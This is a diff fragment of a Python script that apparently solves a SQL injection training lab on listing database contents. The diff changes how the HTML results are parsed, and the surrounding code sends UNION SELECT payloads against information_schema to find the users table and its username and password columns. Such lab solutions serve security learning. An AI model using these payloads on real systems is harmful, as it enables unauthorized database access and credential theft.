@@ -18,13 +18,13 @@ if soup.title.string != 'SQL injection attack, listing the database contents on 
     sys.exit(1)
 
 soup = request(BASE_URL, ' UNION SELECT table_name, NULL FROM information_schema.tables')
-table_name = next((th.text for th in soup.find_all('th') if th.text.startswith('users')), None)
+table_name = soup.select_one('th:-soup-contains("users_")').text
 print('Users table name is', table_name)
 
 soup = request(BASE_URL, (' UNION SELECT column_name, data_type FROM information_schema.columns '
                           f"WHERE table_name='{table_name}'"))
-username_column_name = next((th.text for th in soup.find_all('th') if th.text.startswith('username')), None)
-password_column_name = next((th.text for th in soup.find_all('th') if th.text.startswith('password')), None)
+username_column_name = soup.select_one('th:-soup-contains("username_")').text
+password_column_name = soup.select_one('th:-soup-contains("password_")').text
 
 print('Username column name is', username_column_name)
 print('Password column name is', password_column_name)
